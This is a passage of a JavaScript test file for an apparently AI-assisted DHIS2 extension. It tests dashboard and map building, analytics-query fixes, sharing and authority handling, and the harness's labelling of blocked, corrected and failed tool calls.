      scanOf(va('{ ou, startDate: a, endDate: b, notification: false, persist: false }')) === 0 && scanOf(va('{ ou, startDate: a, endDate: b }')) === 0
      && scanOf(va('{ ou, persist: true }')) > 0 && scanOf(va('{ ou, persist }')) > 0 && scanOf(va('{ ou, notification: flag }')) > 0
      && scanOf(va('{ ou }', "'dataValueSets'")) > 0 && scanOf(va('{ ou }', 'RES')) > 0
      && scanOf(va('{ ou, persist: false }') + "\nfunction B() { const e2 = D2Runtime.useDataEngine(); return e2.mutate({ resource: 'dataStore/x/y', type: 'update', data: {} }); }") > 0);

    // 5. Headline tiles per row.
    const kpi = (n) => ({ itemType: 'VISUALIZATION', vizType: 'SINGLE_VALUE', name: `Number ${n}` });
    const six = [1, 2, 3, 4, 5, 6].map(kpi);
    const def = ctx.layoutDashboardItems(six.map(() => ({})), six, 0, {});
    const one = ctx.layoutDashboardItems(six.map(() => ({})), six, 0, {}, { kpisPerRow: 6 });
    const nine = ctx.layoutDashboardItems(six.map(() => ({})), six, 0, {}, { kpisPerRow: 9 });
    truthy('six single values: two rows of three by default, one row of six 10-column tiles with kpis_per_row 6 (never more than 6)',
      def.shapes.filter((s) => s.y === 0).length === 3 && def.shapes[0].width === 20 && one.shapes.every((s) => s.y === 0 && s.width === 10) && one.rows.length === 1 && nine.shapes.every((s) => s.width === 10));
    truthy('a saved dashboard with six small tiles in a row keeps six when it is re-flowed; four in a row is the default and is not pinned',
      ctx.savedKpisPerRow(one.shapes) === 6 && ctx.savedKpisPerRow(ctx.layoutDashboardItems(six.slice(0, 4).map(() => ({})), six.slice(0, 4), 0, {}).shapes) === null);

    // 6. Reporting rates, one disaggregation, and a category as a dimension.
    ctx.safeDhis2Fetch = async (p) => {
      if (/^dataSets\?filter=id:in:\[BfMAe6Itzgt/.test(p)) return { dataSets: [{ id: 'BfMAe6Itzgt' }] };
      if (/^dataElements\?filter=id:in:\[fbfJHSPpUQD\]&filter=domainType/.test(p)) return { dataElements: [{ id: 'fbfJHSPpUQD' }] };
      if (/^categoryOptionCombos\?/.test(p)) return { categoryOptionCombos: [{ id: 'pq2XI5kz2BY' }] };
      if (/^dataElements\.json/.test(p)) return { dataElements: [{ id: 'fbfJHSPpUQD', domainType: 'AGGREGATE' }] };
      if (/^indicators\.json/.test(p)) return { indicators: /Uvn6LCg7dVU/.test(p) ? [{ id: 'Uvn6LCg7dVU' }] : [] };
      if (/^categories\/fMZEcRHuamy/.test(p)) return { id: 'fMZEcRHuamy', displayName: 'Location Fixed/Outreach', dataDimension: true, categoryOptions: [{ id: 'qkPbeWaFsnU' }, { id: 'wbrDrL2aYEc' }] };
      if (/^categories\?filter=displayName:ilike:Age/.test(p)) return { categories: [{ id: 'cX5k9anHEHd', displayName: 'Age', dataDimension: true, categoryOptions: [{ id: 'aaaaaaaaaa1' }, { id: 'aaaaaaaaaa2' }] }] };
      if (/^categories\?filter=displayName:ilike:/.test(p)) return { categories: [] };
      return {};
    };
    const items = ['BfMAe6Itzgt.REPORTING_RATE', 'BfMAe6Itzgt.ACTUAL_REPORTS_ON_TIME', 'fbfJHSPpUQD.pq2XI5kz2BY', 'fbfJHSPpUQD', 'zzzzzzzzzzz.REPORTING_RATE', 'fbfJHSPpUQD.zzzzzzzzzzz'];
    const res = await ctx.resolveDataItemTypes(items);
    truthy('"<dataSet>.REPORTING_RATE", another reporting metric and "<dataElement>.<categoryOptionCombo>" resolve; an unknown data set or disaggregation does not',
      res.typeMap['BfMAe6Itzgt.REPORTING_RATE'] === 'REPORTING_RATE' && res.typeMap['BfMAe6Itzgt.ACTUAL_REPORTS_ON_TIME'] === 'REPORTING_RATE' && res.typeMap['fbfJHSPpUQD.pq2XI5kz2BY'] === 'DATA_ELEMENT_OPERAND'
      && res.typeMap.fbfJHSPpUQD === 'DATA_ELEMENT' && JSON.stringify(res.unresolved) === '["zzzzzzzzzzz.REPORTING_RATE","fbfJHSPpUQD.zzzzzzzzzzz"]');
    const rr = ctx.buildVisualizationObject({ name: 'Reporting', vis_type: 'LINE', data_items: ['BfMAe6Itzgt.REPORTING_RATE', 'fbfJHSPpUQD.pq2XI5kz2BY'], periods: ['LAST_12_MONTHS'], org_units: ['ImspTQPwCqd'], layout: { category: ['pe'], series: ['dx'], filters: ['ou'] } }, res.typeMap);
    truthy('they are saved in the shape the Data Visualizer app writes',
      rr.ok && JSON.stringify(rr.viz.dataDimensionItems[0]) === '{"dataDimensionItemType":"REPORTING_RATE","reportingRate":{"id":"BfMAe6Itzgt.REPORTING_RATE","dataSet":{"id":"BfMAe6Itzgt"},"metric":"REPORTING_RATE"}}'
      && JSON.stringify(rr.viz.dataDimensionItems[1]) === '{"dataDimensionItemType":"DATA_ELEMENT_OPERAND","dataElementOperand":{"id":"fbfJHSPpUQD.pq2XI5kz2BY","dataElement":{"id":"fbfJHSPpUQD"},"categoryOptionCombo":{"id":"pq2XI5kz2BY"}}}');
    truthy('a reporting rate shades a map too', ctx.buildMapObject({ name: 'RR map', data_item: 'BfMAe6Itzgt.REPORTING_RATE', org_unit_level: 2, period: 'LAST_MONTH' }, res.typeMap).ok !== false && !ctx.buildMapObject({ name: 'RR map', data_item: 'BfMAe6Itzgt.REPORTING_RATE', org_unit_level: 2, period: 'LAST_MONTH' }, res.typeMap)._error);
    const spec = { name: 'ANC 1 by location per month', vis_type: 'STACKED_COLUMN', data_items: ['fbfJHSPpUQD'], periods: ['LAST_12_MONTHS'], org_units: ['ImspTQPwCqd'], layout: { series: ['fMZEcRHuamy'], category: ['pe'], filters: ['ou'] } };
    const catErr = await ctx.resolveVizCategoryDimensions(spec, res.typeMap);
    const cat = ctx.buildVisualizationObject(spec, res.typeMap);
    truthy('a category UID in the layout becomes a dimension with its options: series = the category, x-axis = periods, the data element moves to the filter',
      catErr === null && cat.ok && JSON.stringify(cat.viz.columnDimensions) === '["fMZEcRHuamy"]' && JSON.stringify(cat.viz.rowDimensions) === '["pe"]' && cat.viz.filterDimensions.includes('dx') && cat.viz.filterDimensions.includes('ou')
      && JSON.stringify(cat.viz.categoryDimensions) === '[{"category":{"id":"fMZEcRHuamy"},"categoryOptions":[{"id":"qkPbeWaFsnU"},{"id":"wbrDrL2aYEc"}]}]');
    const byName = { name: 'By age', vis_type: 'PIVOT_TABLE', data_items: ['fbfJHSPpUQD'], periods: ['2025'], org_units: ['ImspTQPwCqd'], layout: { rows: ['Age'], columns: ['pe'], filters: ['ou', 'dx'] } };
    const nameErr = await ctx.resolveVizCategoryDimensions(byName, res.typeMap);
    truthy('…a category given by name is resolved to its UID', nameErr === null && byName.layout.rows[0] === 'cX5k9anHEHd' && ctx.buildVisualizationObject(byName, res.typeMap).viz.rowDimensions[0] === 'cX5k9anHEHd');
    const ind = await ctx.resolveDataItemTypes(['Uvn6LCg7dVU']);
    const indErr = await ctx.resolveVizCategoryDimensions({ data_items: ['Uvn6LCg7dVU'], layout: { series: ['fMZEcRHuamy'], category: ['pe'] } }, ind.typeMap);
    const unknownDim = await ctx.resolveVizCategoryDimensions({ data_items: ['fbfJHSPpUQD'], layout: { series: ['gender'], category: ['pe'] } }, res.typeMap);
    const plain = await ctx.resolveVizCategoryDimensions({ data_items: ['fbfJHSPpUQD'], layout: { series: ['dx'], category: ['pe'], filters: ['ou'] } }, res.typeMap);
    truthy('an indicator cannot be split by a category, a word that is no category is refused with what a layout takes, and a plain layout is untouched',
      indErr && /not a plain aggregate data element/.test(indErr._error) && unknownDim && /not dx, pe, ou or a disaggregation category/.test(unknownDim._error) && plain === null);
    truthy('the data check and the dashboard read-back use the item analytics takes (the reporting rate\'s id is its data set\'s)',
      ctx.dataCheckItems([{ reportingRate: { id: 'BfMAe6Itzgt', dimensionItem: 'BfMAe6Itzgt.REPORTING_RATE', displayName: 'RR' } }])[0].id === 'BfMAe6Itzgt.REPORTING_RATE'
      && ctx.savedObjectDataItems([{ dataDimensionItemType: 'DATA_ELEMENT_OPERAND', dataElementOperand: { id: 'fbfJHSPpUQD.pq2XI5kz2BY', dimensionItem: 'fbfJHSPpUQD.pq2XI5kz2BY' } }])[0].id === 'fbfJHSPpUQD.pq2XI5kz2BY');

    // 7. Two identical yeses in a row.
    const offer = 'Want me to share the dashboard publicly, or add a facility-level pivot instead of the monthly one?';
    vm.runInContext(`lastUserText = "Yes, go ahead."; conversationHistory = ${JSON.stringify([
      { role: 'user', content: 'Set up the report' }, { role: 'assistant', content: 'Done. Want me to add these indicators to the form, or build a dashboard?' },
      { role: 'user', content: 'Yes, go ahead.' }, { role: 'assistant', content: `Both done. ${offer}` },
    ])};`, ctx);
    const second = ctx.sharingOfferAgreed();
    vm.runInContext(`conversationHistory = conversationHistory.concat([{ role: 'user', content: 'Yes, go ahead.' }]);`, ctx);
    const inTurn = ctx.sharingOfferAgreed();
    vm.runInContext(`conversationHistory = ${JSON.stringify([{ role: 'user', content: 'Set up the report' }, { role: 'assistant', content: 'Done. Want me to build a dashboard?' }])};`, ctx);
    const noOffer = ctx.sharingOfferAgreed();
    truthy('a second "Yes, go ahead." answers the LAST question (the sharing offer), also when this turn\'s message is already in the history; with no sharing offer it agrees to none',
      second === true && inTurn === true && noOffer === false && ctx.sharingWasRequested({ public_access: 'r-------' }) === false);
    vm.runInContext('lastUserText = ""; conversationHistory = [];', ctx);

    // 8. A stale "analytics tables predate the program" is not remembered.
    let last = '2026-11-13T13:00:01.448';
    ctx.safeDhis2Fetch = async (p) => (/^system\/info/.test(p) ? { lastAnalyticsTableSuccess: last } : { id: 'DgJkLZz5cR2', created: '2026-11-13T13:09:45.120' });
    vm.runInContext('_analyticsFreshCache.clear();', ctx);
    const stale = await ctx.lineListAnalyticsFresh('DgJkLZz5cR2');
    last = '2026-11-13T13:13:21.480';
    const fresh = await ctx.lineListAnalyticsFresh('DgJkLZz5cR2');
    truthy('after the analytics job has run, the line-list check stops saying the tables predate the program', stale.fresh === false && fresh.fresh === true);
    vm.runInContext('_analyticsFreshCache.clear();', ctx);

    // 8b. A mistyped id and a joined list on event analytics.
    ctx.safeDhis2Fetch = async (p) => {
      if (/^programIndicators\?filter=id:in:/.test(p)) return { programIndicators: ['QNcTSbHbszb', 'qSiJfRk4Quy', 'ZPFgT0IUynJ'].filter((id) => p.includes(id)).map((id) => ({ id })) };
      if (/^programIndicators\?filter=program\.id:eq:/.test(p)) return { programIndicators: [{ id: 'QNcTSbHbszb', displayName: 'Supervision visits' }, { id: 'qSiJfRk4Quy', displayName: 'Average total score' }, { id: 'ZPFgT0IUynJ', displayName: 'Visits with band Poor' }] };
      return {};
    };
    const base = 'analytics/events/aggregate/DgJkLZz5cR2?dimension=ou:hkoY6TPi00f&dimension=pe:LAST_12_MONTHS&stage=mFGnGuwp6qt&dimension=';
    const typo = await ctx.routeProgramIndicatorAnalytics(`${base}QNcTSbHbszb;qSiJfRk4Quy;ZPFg0IUynJ`);
    const changed = await ctx.routeProgramIndicatorAnalytics(`${base}QNcTSbHbszb;ZPFgT0IUynX`);
    const good = await ctx.routeProgramIndicatorAnalytics(`${base}QNcTSbHbszb;qSiJfRk4Quy;ZPFgT0IUynJ`);
    truthy('an id one character short (or with one changed) among program indicators is not sent: the answer names the indicator that was meant; the right ids are read from /analytics',
      typo.refusal && /"ZPFg0IUynJ" is not a program indicator — did you mean ZPFgT0IUynJ \("Visits with band Poor"\)/.test(typo.refusal._error)
      && changed.refusal && /did you mean ZPFgT0IUynJ/.test(changed.refusal._error) && good.routed === true && /^analytics\?dimension=dx%3AQNcTSbHbszb%3BqSiJfRk4Quy%3BZPFgT0IUynJ/.test(good.path));
    const des = await ctx.routeProgramIndicatorAnalytics(`${base}cQpIbTxJRtp;zexhnHw1CzB`);
    const single = await ctx.routeProgramIndicatorAnalytics(`${base}cQpIbTxJRtp`);
    truthy('data elements joined by ";" in one dimension= are sent as one dimension each (409 as written); a single one is left alone',
      des.healed === true && /dimension=cQpIbTxJRtp&dimension=zexhnHw1CzB$/.test(des.path) && /stage=mFGnGuwp6qt/.test(des.path) && !single.healed && !single.routed && !single.refusal);
    truthy('one edit apart: a dropped, an added or a changed character, and nothing further',
      ctx.uidWithinOneEdit('ZPFg0IUynJ', 'ZPFgT0IUynJ') && ctx.uidWithinOneEdit('ZPFgT0IUynJJ', 'ZPFgT0IUynJ') && ctx.uidWithinOneEdit('ZPFgT0IUynX', 'ZPFgT0IUynJ')
      && !ctx.uidWithinOneEdit('ZPFgT0IUynJ', 'ZPFgT0IUynJ') && !ctx.uidWithinOneEdit('ZPFg0IUynX', 'ZPFgT0IUynJ') && !ctx.uidWithinOneEdit('abcdefghijk', 'ZPFgT0IUynJ'));

    // 8c. A table that was never built.
    {
      const hint = ctx.analyticsMissingTableHint;
      const e7144 = { errorCode: 'E7144', message: 'Query failed because a referenced table does not exist. Please ensure analytics job was run (SqlState: 42P01)' };
      d.analyticsTableMissing = null;
      const none = hint('GET', 'analytics?dimension=dx:abc', 'DHIS2 API 409: Dimension is present in query without any valid dimension options', { errorCode: 'E7124' });
      const sql = hint('GET', 'sqlViews/abcdefghijk/data', 'DHIS2 API 409: referenced table does not exist', e7144);
      const before = ctx.analyticsTableMissingThisTurn();
      const rr = hint('GET', 'analytics?dimension=dx%3An9XXALn5EoL.REPORTING_RATE&dimension=pe%3A202610', `DHIS2 API 409: ${e7144.message}`, e7144);
      truthy('409 "referenced table does not exist" on analytics is explained (the table was never built: a scheduled job can skip it; only a run builds it; do not investigate) and remembered for the turn; other 409s and SQL views are not',
        none === null && sql === null && before === false && /reporting-completeness analytics table/.test(rr) && /resourceTables\/analytics/.test(rr) && /Do not look for the reason/.test(rr) && ctx.analyticsTableMissingThisTurn() === true);
      const sent = [];
      ctx.safeDhis2Fetch = async (p, o = {}) => { sent.push(`${(o && o.method) || 'GET'} ${p}`); return /^resourceTables/.test(p) ? { response: { id: 'jobAAAAAAAA' } } : /^system\/tasks/.test(p) ? [{ completed: true, message: 'done' }] : /^system\/info/.test(p) ? { lastAnalyticsTableSuccess: '2026-11-13T21:00:01.039' } : { programs: [{ id: 'DgJkLZz5cR2', displayName: 'P', created: '2026-11-13T13:09:45.120' }] }; };
      d.writeAuth = { scope: 'read_only', reason: 'verify' };
      vm.runInContext('lastUserText = "Build a dashboard of reporting rates"; conversationHistory = [];', ctx);
      const savedWait = vm.runInContext('typeof ANALYTICS_JOB_POLL_MS', ctx);
      const runIt = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'resourceTables/analytics', query_params: { skipResourceTables: 'true', skipTableTypes: 'COMPLETENESS', lastYears: '2' } });
      const again = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'resourceTables/analytics' });
      d.writeSeq = (d.writeSeq || 0) + 1; // something was saved since
      vm.runInContext('lastUserText = "run the analytics tables again please";', ctx);
      const afterWrite = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'resourceTables/analytics' });
      d.analyticsRun = null;
      vm.runInContext('lastUserText = "Build a dashboard of reporting rates";', ctx);
      const refused = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'resourceTables/analytics' });
      truthy('with a table proved missing this turn an analytics run the user did not ask for is started, without the skip parameters that would leave the table out; with none missing it is still refused',
        savedWait === 'number' && runIt && runIt.success === true && sent.some((x) => x === 'POST resourceTables/analytics?lastYears=2') && refused && refused._scope === 'analytics_run_not_requested');
      truthy('a second run in the same turn with nothing written since is not started (it would build the same tables); after a write it is',
        again && again._scope === 'analytics_run_repeat' && /Not started: the analytics tables were already rebuilt in this turn/.test(again._error) && afterWrite && afterWrite.success === true);
      const lay = ctx.healAnalyticsTableLayout;
      truthy('columns= / rows= / tableLayout are left out of analytics queries (a laid-out table with blank cells reads like "no data"); other parameters and other endpoints are untouched',
        lay('analytics?dimension=dx:a;b&dimension=pe:202610&dimension=ou:X&columns=dx&rows=ou').path === 'analytics?dimension=dx:a;b&dimension=pe:202610&dimension=ou:X'
        && lay('analytics/events/aggregate/DgJkLZz5cR2?dimension=ou:X&rows=ou&columns=pe&stage=S').path === 'analytics/events/aggregate/DgJkLZz5cR2?dimension=ou:X&stage=S'
        && /blank cells/.test(lay('analytics?dimension=dx:a&tableLayout=true&columns=dx&rows=pe').note)
        && !lay('analytics?dimension=dx:a&dimension=pe:2026&skipMeta=true').healed && !lay('dataValueSets?dataSet=a&rows=1').healed && !lay('analytics/events/query/DgJkLZz5cR2?rows=ou').healed);
      vm.runInContext('lastUserText = "";', ctx);
    }

    // 8d. A grant on an object that is public anyway.
    {
      const note = ctx.sharingPublicStillOpenNote;
      const grp = [{ id: 'Xxe4VF5QEfF', access: 'r-rw----' }];
      const open = note({ user_group_accesses: grp }, 'rwrw----', grp, []);
      truthy('a group given capture access to a program that is public rwrw---- is told: everyone can already do this, ask before closing it; a closed or metadata-only-public object, or a call that grants nobody, gets no note',
        /EVERY signed-in user can see it, edit it, view its data, enter data in it, so this grant gives the group or user nothing/.test(open._public_access_still_open || '')
        && !note({ user_group_accesses: grp }, '--------', grp, [])._public_access_still_open
        && /can see it\./.test(note({ user_group_accesses: grp }, 'r-------', grp, [])._public_access_still_open || '') && !/nothing they did not already have/.test(note({ user_group_accesses: grp }, 'r-------', grp, [])._public_access_still_open)
        && !note({ public_access: 'rwrw----' }, 'rwrw----', [], [])._public_access_still_open);
      const cat = [{ id: 'F_DATAVALUE_ADD', name: 'Add/Update Data Value' }, { id: 'M_dhis-web-capture', name: 'Capture app' }, { id: 'F_EXPORT_DATA', name: 'Export data' }, { id: 'F_USER_ADD', name: 'Add/Update User' }];
      ctx.safeDhis2Fetch = async (p) => (/^authorities/.test(p) ? { systemAuthorities: cat } : {});
      vm.runInContext('_adminCache.authorities = null;', ctx);
      const many = await ctx.executeTool('manage_users', { action: 'list_authorities', query: 'capture, export | data value' });
      const oneQ = await ctx.executeTool('manage_users', { action: 'list_authorities', query: 'user' });
      truthy('list_authorities takes several keywords at once and returns the authorities matching any of them',
        many.total === 3 && !many.authorities.some((a) => a.id === 'F_USER_ADD') && oneQ.total === 1);
      vm.runInContext('_adminCache.authorities = null;', ctx);
    }

    // 9. What the panel shows for a call that did not succeed.
    const kind = ctx.toolOutcomeKind;
    truthy('DHIS2 or the network refusing a call is "failed"',
      kind({ _error: 'DHIS2 API 409: Conflict', _status: 409, _url: 'x' }) === 'failed' && kind({ _error: 'DHIS2 API 404: this server has no GET endpoint at "foo".', _status: 404, _hint: 'h', _scope: 'no_such_endpoint' }) === 'failed'
      && kind({ _error: 'Failed to update dataset: DHIS2 API 409: E5003', _hint: 'rename it' }) === 'failed' && kind({ _error: 'Fetch failed: fetch failed' }) === 'failed'
      && kind({ success: false, errors: ['Property `name` already exists'] }) === 'failed' && kind({ _error: 'Tool failed: x is not a function' }) === 'failed'
      && kind({ _error: 'Analytics table generation FAILED after 75s: boom', _hint: 'report it' }) === 'failed' && kind({ _error: 'Upload failed (HTTP 500)' }) === 'failed' && kind({ _error: 'something odd' }) === 'failed');
    truthy('a call the extension itself stopped is "harness_blocked": loop guards (even when they quote a server error), write and privacy gates, unrequested sharing',
      kind({ _error: 'BLOCKED: this exact dhis2_query call already failed 1 time(s) this turn with: "DHIS2 API 404".', _scope: 'repeated_identical_failure' }) === 'harness_blocked'
      && kind({ _error: 'STOP: 3 HTTP 4xx/5xx errors in a row this turn', _scope: 'http_error_limit_reached' }) === 'harness_blocked' && kind({ _error: 'Refused: deletes', _refused: {}, _scope: 'delete_not_requested' }) === 'harness_blocked'
      && kind({ _error: 'x is disabled for the rest of this turn', _scope: 'circuit_breaker_tool_disabled' }) === 'harness_blocked' && kind({ _error: 'Not changed: the user did not ask to share this dashboard.' }) === 'harness_blocked'
      && kind({ _error: 'Row-level patient data is not sent to a cloud model.', _scope: 'patient_data_privacy_gate' }) === 'harness_blocked' && kind({ _error: 'No program in context', _hint: 'pass program_override' }) === 'harness_blocked');
    truthy('a call sent back to be fixed is "harness_correcting": lint problems, a cut-off call, a guessed endpoint, a missing argument',
      kind({ _error: 'The code would fail at runtime: 2 problem(s).', problems: [{ message: 'x' }], _hint: 'fix' }) === 'harness_correcting' && kind({ _error: 'args truncated', _scope: 'incomplete_call', _no_disable: true }) === 'harness_correcting'
      && kind({ _error: 'Not sent: there is no "validation" endpoint on DHIS2 (404).', _scope: 'known_endpoint_guidance' }) === 'harness_correcting' && kind({ _error: 'dataset_id required for update' }) === 'harness_correcting'
      && kind({ _error: 'patch object required for update', _hint: 'Pass patch:{…}' }) === 'harness_correcting' && kind({ _error: 'JSX does not compile: app.jsx:437:10 Unexpected token', compile_errors: [{}] }) === 'harness_correcting');
    truthy('a successful call has no outcome to show', kind({ success: true }) === 'ok' && kind({ rows: [] }) === 'ok');
    const panelJs = fs.readFileSync(path.join(ROOT, 'sidepanel/panel.js'), 'utf8');
    const panelCss = fs.readFileSync(path.join(ROOT, 'sidepanel/panel.css'), 'utf8');
    truthy('the panel labels those "Harness blocked" / "Harness correcting" in orange, keeps "Failed" and red for real failures, and does not count them as failed steps',
      /'Harness correcting'/.test(panelJs) && /'Harness blocked'/.test(panelJs) && /tool-harness/.test(panelJs) && /\.tool-harness\s*\{[^}]*var\(--harness\)/.test(panelCss) && /--harness:\s*#f97316/.test(panelCss)
      && /msg\.outcome/.test(panelJs) && /querySelector\('\.tool-fail'\)\)\.length/.test(panelJs));
  } finally {
    ctx.safeDhis2Fetch = saved.sdf;
    Object.assign(d, { writeAuth: saved.wa, httpErrorCount: saved.n, httpErrorHistory: saved.h, failedCallSigs: saved.f, toolErrorFamilies: saved.fam, baseUrl: saved.base, connected: saved.connected });
    vm.runInContext('lastUserText = ""; conversationHistory = [];', ctx);
  }
}

// ── Maternity thread (src/data-check.js): what saved items will really show ───
async function runMaternityThreadChecks() {
  console.log('\nMaternity thread (data check, fresh reads, maps that never open empty, list notes):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = vm.runInContext('dhis2', ctx);
  const saved = { sdf: ctx.safeDhis2Fetch, fetch: ctx.fetch, broadcast: ctx.broadcast, exec: ctx.executeTool, base: d.baseUrl, connected: d.connected, apiVersion: d.apiVersion, pageContext: d.pageContext, metaOnly: d.metadataOnlyTurn, turn: d.turnDataCheck, hist: JSON.parse(JSON.stringify(vm.runInContext('conversationHistory', ctx))) };
  Object.assign(d, { baseUrl: 'https://dhis.invalid', connected: true, apiVersion: 43, pageContext: { appType: 'Dashboard' }, metadataOnlyTurn: false });
  vm.runInContext('_dataCheckCache.clear();', ctx);

  // Fresh reads and the aggregate endpoint's 500.
  const key = ctx.withEventAggregateCacheKey;
  truthy('skipMeta=true is taken off an event aggregate (500 on 2.43.2)', !/skipMeta/.test(key('analytics/events/aggregate/P?dimension=pe:2026&skipMeta=true&stage=S')) && /stage=S/.test(key('analytics/events/aggregate/P?dimension=pe:2026&skipMeta=true&stage=S')));
  truthy('…at the end of the query too, leaving no stray separator', !/[?&]$/.test(key('analytics/events/aggregate/P?limit=5&skipMeta=true')));
  truthy('…and left alone on other endpoints', /skipMeta=true/.test(key('analytics?dimension=dx:a&skipMeta=true')));
  truthy('a stable limit is still added', /limit=\d+/.test(key('analytics/events/aggregate/P?dimension=pe:2026')));
  const seen = [];
  ctx.fetch = async (u, o) => { seen.push(o || {}); return new Response('{"ok":true}', { status: 200, headers: { 'Content-Type': 'application/json' } }); };
  await ctx.__realSafeDhis2Fetch('analytics?dimension=dx:aaaaaaaaaaa&dimension=pe:2026&dimension=ou:USER_ORGUNIT');
  truthy('reads skip the browser cache (a server can tell it to keep analytics answers for two weeks)', seen[0] && seen[0].cache === 'no-store');
  seen.length = 0;
  await ctx.__realSafeDhis2Fetch('dataStore/x/y', { method: 'POST', body: { a: 1 } });
  truthy('…writes are not touched', !seen.some(o => o.cache === 'no-store'));
  ctx.fetch = saved.fetch;

  // Maps never open on an empty continent.
  const typeMap = { piAAAAAAAAA: 'PROGRAM_INDICATOR' };
  const map = (over) => ctx.buildMapObject({ name: 'T', data_item: 'piAAAAAAAAA', org_unit_level: 2, org_units: ['ImspTQPwCqd'], period: '2026', ...over }, typeMap).map;
  const thematic = (m) => m.mapViews.find(v => v.layer === 'thematic');
  const boundary = (m) => m.mapViews.find(v => v.layer === 'boundary');
  truthy('a shaded map draws places without data in grey', thematic(map({})).noDataColor === '#D9D9D9');
  truthy('…no_data_color:"" asks for none', !thematic(map({ no_data_color: '' })).noDataColor);
  truthy('…a given colour is kept', thematic(map({ no_data_color: '#123456' })).noDataColor === '#123456');
  truthy('a bubble map gets district outlines, not grey markers on every facility', boundary(map({ thematic_map_type: 'BUBBLE', org_unit_level: 4 })).organisationUnitLevels[0] === 2 && !thematic(map({ thematic_map_type: 'BUBBLE', org_unit_level: 4 })).noDataColor);
  truthy('…boundary_level:0 asks for none', !boundary(map({ thematic_map_type: 'BUBBLE', org_unit_level: 4, boundary_level: 0 })));
  truthy('…an asked-for level is kept', boundary(map({ thematic_map_type: 'BUBBLE', org_unit_level: 4, boundary_level: 3 })).organisationUnitLevels[0] === 3);

  // Bare date and place columns with their scope on the filters axis.
  const scoped = ctx.lineListMergeScopeFilters(
    ['uniqueId', { dimension: 'enrollment_date' }, { dimension: 'ou' }, { dimension: 'program_status' }],
    [{ dimension: 'ou', org_units: ['ouAAAAAAAAA'] }, { dimension: 'enrollmentDate', periods: ['2026'] }, { dimension: 'deAAAAAAAAA', filter: { operator: 'EQ', value: 1 } }]);
  truthy('a period on the filters axis moves onto its bare date column', JSON.stringify(scoped.columns[1].periods) === '["2026"]');
  truthy('…an org unit onto its bare org-unit column, in place', JSON.stringify(scoped.columns[2].org_units) === '["ouAAAAAAAAA"]' && scoped.columns.length === 4);
  truthy('…a real filter stays a filter', scoped.filters.length === 1 && scoped.filters[0].dimension === 'deAAAAAAAAA');
  const keptScope = ctx.lineListMergeScopeFilters([{ dimension: 'ou', org_units: ['ouBBBBBBBBB'] }], [{ dimension: 'ou', org_units: ['ouAAAAAAAAA'] }]);
  truthy('…a column with its own org units is not overwritten', keptScope.columns[0].org_units[0] === 'ouBBBBBBBBB' && keptScope.filters.length === 1);
  const noColumn = ctx.lineListMergeScopeFilters(['deAAAAAAAAA'], [{ dimension: 'ou', org_units: ['ouAAAAAAAAA'] }]);
  truthy('…org units with no such column stay on the filters axis', noColumn.filters.length === 1 && noColumn.columns.length === 1);

  // A probe that only asks "does it run, is it empty".
  const noVal = ctx.lineListProbeWithoutValues;
  truthy('an enrollment probe asks for one row with the facility name alone', noVal('analytics/enrollments/query/P?dimension=ou:X&pageSize=100') === 'analytics/enrollments/query/P?dimension=ou:X&pageSize=1&headers=ouname');
  truthy('…an event probe keeps its total', noVal('analytics/events/query/P?pageSize=1&totalPages=true') === 'analytics/events/query/P?pageSize=1&totalPages=true&headers=ouname');
  truthy('…asking twice changes nothing', noVal(noVal('analytics/events/query/P?pageSize=1')) === noVal('analytics/events/query/P?pageSize=1'));
  truthy('…other paths are left alone', noVal('programs/abc?fields=id') === 'programs/abc?fields=id');
  const probeSeen = [];
  ctx.safeDhis2Fetch = async (p) => { probeSeen.push(p); return { headers: [{ name: 'ouname' }], rows: [['x']] }; };
  d.metadataOnlyTurn = true;
  await ctx.lineListRunProbe('analytics/enrollments/query/P?dimension=ou:X&pageSize=100');
  d.metadataOnlyTurn = false;
  await ctx.lineListRunProbe('analytics/enrollments/query/P?dimension=ou:X&pageSize=100');
  truthy('a metadata-only request reads no values through a list probe', /headers=ouname/.test(probeSeen[0]) && /pageSize=1\b/.test(probeSeen[0]));
  truthy('…an ordinary one still counts its rows', !/headers=/.test(probeSeen[1]) && /pageSize=100/.test(probeSeen[1]));

  // Reading a saved object.
  const refs = ctx.dataCheckIndicatorFields({ program: { id: 'progAAAAAAA' }, expression: "d2:condition(\"#{stageAAAAAA.deAAAAAAAAA} == 'x'\", 100, 0)", filter: "V{program_stage_id} == 'stageAAAAAA' && d2:hasValue(#{stageAAAAAA.deBBBBBBBBB}) && A{teaAAAAAAAA} == 'y'" });
  truthy('an indicator\'s fields are read from its expression and filter', refs.length === 3 && refs[0].id === 'deAAAAAAAAA' && refs[2].kind === 'tea');
  truthy('a level and a user org unit are both asked for', ctx.dataCheckOuDimension({ organisationUnits: [{ id: 'ouAAAAAAAAA' }], organisationUnitLevels: [2], userOrganisationUnit: true }) === 'ouAAAAAAAAA;USER_ORGUNIT;LEVEL-2');
  truthy('fixed and relative periods are both asked for', ctx.dataCheckPeDimension({ periods: [{ id: '2026' }], relativePeriods: { lastYear: true, thisYear: false } }) === '2026;LAST_YEAR');
  const token = ctx.relativeKeyToPeriodToken;
  truthy('a saved "last 12 months" becomes a keyword analytics accepts', token('last12Months') === 'LAST_12_MONTHS');
  truthy('…the irregular ones too', token('thisDay') === 'TODAY' && token('last2SixMonths') === 'LAST_2_SIXMONTHS' && token('last6BiMonths') === 'LAST_6_BIMONTHS' && token('biMonthsThisYear') === 'BIMONTHS_THIS_YEAR');
  truthy('…every known flag comes back as its own keyword', Object.entries(vm.runInContext('VIZ_REL_PERIOD_FLAG', ctx)).every(([kw, flag]) => token(flag) === kw));

  // The check itself, on a fixture server.
  const PI = (id, name, expr, filter) => ({ dataDimensionItemType: 'PROGRAM_INDICATOR', programIndicator: { id, displayName: name, expression: expr, filter, program: { id: 'progAAAAAAA' } } });
  const fixture = (over = {}) => async (p) => {
    const path = String(p);
    if (path.startsWith('dashboards/')) return { dashboardItems: [{ visualization: { id: 'vizSVAAAAAA' } }, { visualization: { id: 'vizCHAAAAAA' } }] };
    if (path.startsWith('visualizations?')) return { visualizations: [
